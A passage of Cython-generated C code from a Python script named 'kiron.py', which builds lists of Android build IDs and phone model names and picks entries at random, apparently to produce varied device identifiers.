  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 275, __pyx_n_s_NRD90M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T315);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T315);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 276, __pyx_kp_s_SM_T315)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_JDQ39);
  __Pyx_GIVEREF(__pyx_n_s_JDQ39);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 277, __pyx_n_s_JDQ39)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J320F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 278, __pyx_kp_s_SM_J320F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LMY47V);
  __Pyx_GIVEREF(__pyx_n_s_LMY47V);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 279, __pyx_n_s_LMY47V)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_I9190);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9190);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 280, __pyx_kp_s_GT_I9190)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 281, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_P5220);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P5220);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 282, __pyx_kp_s_GT_P5220)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_JDQ39);
  __Pyx_GIVEREF(__pyx_n_s_JDQ39);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 283, __pyx_n_s_JDQ39)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T525);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T525);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 284, __pyx_kp_s_SM_T525)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 285, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T555);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T555);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 286, __pyx_kp_s_SM_T555)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_LRX22G);
  __Pyx_GIVEREF(__pyx_n_s_LRX22G);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 287, __pyx_n_s_LRX22G)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_I9190);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9190);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 288, __pyx_kp_s_GT_I9190)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 289, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_J510FN);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J510FN);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 290, __pyx_kp_s_SM_J510FN)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_NMF26X_2);
  __Pyx_GIVEREF(__pyx_kp_s_NMF26X_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 291, __pyx_kp_s_NMF26X_2)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_A500F);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500F);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 292, __pyx_kp_s_SM_A500F)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_MMB29M);
  __Pyx_GIVEREF(__pyx_n_s_MMB29M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 293, __pyx_n_s_MMB29M)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_I9192);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9192);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 294, __pyx_kp_s_GT_I9192)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 295, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_GT_P5100);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P5100);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 296, __pyx_kp_s_GT_P5100)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_JDQ);
  __Pyx_GIVEREF(__pyx_n_s_JDQ);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 297, __pyx_n_s_JDQ)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_SM_T311);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T311);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 298, __pyx_kp_s_SM_T311)) __PYX_ERR(0, 340, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_KOT49H);
  __Pyx_GIVEREF(__pyx_n_s_KOT49H);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_2, 299, __pyx_n_s_KOT49H)) __PYX_ERR(0, 340, __pyx_L1_error);
  __pyx_t_4 = NULL;
  __pyx_t_5 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_5 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_4, __pyx_t_2};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_5, 1+__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 340, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __pyx_v_kkkkki = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "kiron.py":341
 *      bbbb = random.choice(['PQ3B.190801.002', 'PQ1A.181205.002.A1', 'G950FXXU4DSBA', 'QKQ1.190910.002', 'G950FXXS5DSF1', 'G950FXXS8DTC6', 'G998USQU1ATCU', 'G985FXXU7DTJ2', 'N986BXXU1BTJ4', 'A525FXXU3AUG4', 'T970XXU3BUI7', 'F916BXXU1BTKF', 'N970FXXS8ETK4', 'G975USQU4ETG1', 'A715FXXU3ATI8', 'T500XXU3BUA8', 'OPM6.171019.030.K1', 'OPM2.171026.006.C1', 'TQ1A.230105.001.A3', 'SQ1A.211205.008', 'SD1A.210817.037.A1', 'RP1A.201005.004.A1', 'PQ1A.181205.006', 'N9F27L', 'PPR1.180610.011', 'PPR2.180905.006', 'QP1A.191105.003', 'RD1A.201105.003.C1', 'MMB29U', 'NDE63H', 'N4F26J', 'NMF27D', 'N4F26X', 'KOT49H', 'JWR66L', 'LMY48G', 'LMY48J', 'MDB08M', 'HLK75H', 'HLK75F', 'HRI83', 'HLK75C', 'EPE54B', 'G950FXXU3CRGH', 'G950FXXS6DTA1'])
 *      kkkkki = random.choice(['RMX2185','RMX2085','SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
 *      mmmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])             # <<<<<<<<<<<<<<
 *      mmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e','Realme','Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
 *      cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 341, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 341, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyList_New(64); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 341, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_kp_s_Optimus_Vu);
  __Pyx_GIVEREF(__pyx_kp_s_Optimus_Vu);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 0, __pyx_kp_s_Optimus_Vu)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_OT_7025D);
  __Pyx_GIVEREF(__pyx_kp_s_OT_7025D);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 1, __pyx_kp_s_OT_7025D)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_P10_Lite_LTE);
  __Pyx_GIVEREF(__pyx_kp_s_P10_Lite_LTE);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 2, __pyx_kp_s_P10_Lite_LTE)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_P2);
  __Pyx_GIVEREF(__pyx_n_s_P2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 3, __pyx_n_s_P2)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_P20_Lite);
  __Pyx_GIVEREF(__pyx_kp_s_P20_Lite);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 4, __pyx_kp_s_P20_Lite)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_P30_Pro_Global);
  __Pyx_GIVEREF(__pyx_kp_s_P30_Pro_Global);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 5, __pyx_kp_s_P30_Pro_Global)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_P3400);
  __Pyx_GIVEREF(__pyx_n_s_P3400);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 6, __pyx_n_s_P3400)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_P55_Max);
  __Pyx_GIVEREF(__pyx_kp_s_P55_Max);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 7, __pyx_kp_s_P55_Max)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_P7_Max);
  __Pyx_GIVEREF(__pyx_kp_s_P7_Max);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 8, __pyx_kp_s_P7_Max)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_P8_Lite);
  __Pyx_GIVEREF(__pyx_kp_s_P8_Lite);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 9, __pyx_kp_s_P8_Lite)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_P9_Lite);
  __Pyx_GIVEREF(__pyx_kp_s_P9_Lite);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 10, __pyx_kp_s_P9_Lite)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Pacific_800i);
  __Pyx_GIVEREF(__pyx_kp_s_Pacific_800i);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 11, __pyx_kp_s_Pacific_800i)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Pearl_8100);
  __Pyx_GIVEREF(__pyx_kp_s_Pearl_8100);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 12, __pyx_kp_s_Pearl_8100)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Phoenix_2);
  __Pyx_GIVEREF(__pyx_kp_s_Phoenix_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 13, __pyx_kp_s_Phoenix_2)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Phone);
  __Pyx_GIVEREF(__pyx_n_s_Phone);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 14, __pyx_n_s_Phone)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Pixel);
  __Pyx_GIVEREF(__pyx_n_s_Pixel);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 15, __pyx_n_s_Pixel)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Pixel_3);
  __Pyx_GIVEREF(__pyx_kp_s_Pixel_3);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 16, __pyx_kp_s_Pixel_3)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Pixel_XL);
  __Pyx_GIVEREF(__pyx_kp_s_Pixel_XL);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 17, __pyx_kp_s_Pixel_XL)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Pixi);
  __Pyx_GIVEREF(__pyx_n_s_Pixi);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 18, __pyx_n_s_Pixi)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Prada_3_0);
  __Pyx_GIVEREF(__pyx_kp_s_Prada_3_0);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 19, __pyx_kp_s_Prada_3_0)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Pre3);
  __Pyx_GIVEREF(__pyx_n_s_Pre3);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 20, __pyx_n_s_Pre3)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Primo_GH7);
  __Pyx_GIVEREF(__pyx_kp_s_Primo_GH7);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 21, __pyx_kp_s_Primo_GH7)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Quad_EVO_Energy_5);
  __Pyx_GIVEREF(__pyx_kp_s_Quad_EVO_Energy_5);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 22, __pyx_kp_s_Quad_EVO_Energy_5)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Quantum_4);
  __Pyx_GIVEREF(__pyx_kp_s_Quantum_4);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 23, __pyx_kp_s_Quantum_4)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Radar_4G);
  __Pyx_GIVEREF(__pyx_kp_s_Radar_4G);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 24, __pyx_kp_s_Radar_4G)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Radar_C110e);
  __Pyx_GIVEREF(__pyx_kp_s_Radar_C110e);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 25, __pyx_kp_s_Radar_C110e)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Realme_2);
  __Pyx_GIVEREF(__pyx_kp_s_Realme_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 26, __pyx_kp_s_Realme_2)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Red_Rice);
  __Pyx_GIVEREF(__pyx_kp_s_Red_Rice);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 27, __pyx_kp_s_Red_Rice)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_2);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 28, __pyx_kp_s_Redmi_2)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_3);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_3);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 29, __pyx_kp_s_Redmi_3)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_4);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_4);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 30, __pyx_kp_s_Redmi_4)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_5);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_5);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 31, __pyx_kp_s_Redmi_5)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_5_Plus);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_5_Plus);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 32, __pyx_kp_s_Redmi_5_Plus)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_5A);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_5A);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 33, __pyx_kp_s_Redmi_5A)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_6);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_6);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 34, __pyx_kp_s_Redmi_6)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_3);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_3);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 35, __pyx_kp_s_Redmi_Note_3)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_4);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_4);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 36, __pyx_kp_s_Redmi_Note_4)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Note_5);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Note_5);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 37, __pyx_kp_s_Redmi_Note_5)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_S2);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_S2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 38, __pyx_kp_s_Redmi_S2)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Y1);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Y1);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 39, __pyx_kp_s_Redmi_Y1)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Redmi_Y2);
  __Pyx_GIVEREF(__pyx_kp_s_Redmi_Y2);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 40, __pyx_kp_s_Redmi_Y2)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Rex_60);
  __Pyx_GIVEREF(__pyx_kp_s_Rex_60);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 41, __pyx_kp_s_Rex_60)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_Rex_80);
  __Pyx_GIVEREF(__pyx_kp_s_Rex_80);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 42, __pyx_kp_s_Rex_80)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Rhyme);
  __Pyx_GIVEREF(__pyx_n_s_Rhyme);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 43, __pyx_n_s_Rhyme)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_kp_s_RM_560);
  __Pyx_GIVEREF(__pyx_kp_s_RM_560);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 44, __pyx_kp_s_RM_560)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_Ruby);
  __Pyx_GIVEREF(__pyx_n_s_Ruby);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 45, __pyx_n_s_Ruby)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_S4502M);
  __Pyx_GIVEREF(__pyx_n_s_S4502M);
  if (__Pyx_PyList_SET_ITEM(__pyx_t_3, 46, __pyx_n_s_S4502M)) __PYX_ERR(0, 341, __pyx_L1_error);
  __Pyx_INCREF(__pyx_n_s_S4505M);
  __Pyx_GIVEREF(__pyx_n_s_S4505M);
